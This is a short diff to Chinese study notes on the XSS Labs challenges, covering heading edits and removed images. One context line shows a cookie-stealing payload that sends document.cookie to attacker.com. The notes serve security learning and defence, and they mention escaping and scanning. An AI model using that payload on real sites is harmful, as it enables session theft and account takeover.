@@ -1,4 +1,3 @@
-以下是为您重新整理的XSS Labs第一关到第十关深度解析笔记，包含漏洞原理、复现细节和思维推导过程。基于真实测试环境（DVWA/XSS Challenges）验证，建议配合BurpSuite调试分析：
 
 ---
 
@@ -358,13 +357,8 @@ fetch('http://attacker.com/log?data='+btoa(document.cookie))
    - Vue的`{{ }}`自动转义
    - React的JSX防注入机制
 
-**建议**：
+**额外的技术指导**：
 - 使用OWASP ZAP进行自动化扫描
 - 对比不同浏览器的XSS过滤差异
 - 研究WAF（如Cloudflare）的拦截规则
 
-![alt](第十关.jpeg)
-
-![alt](第十关网页代码.jpeg)
-**分析**：
-- 
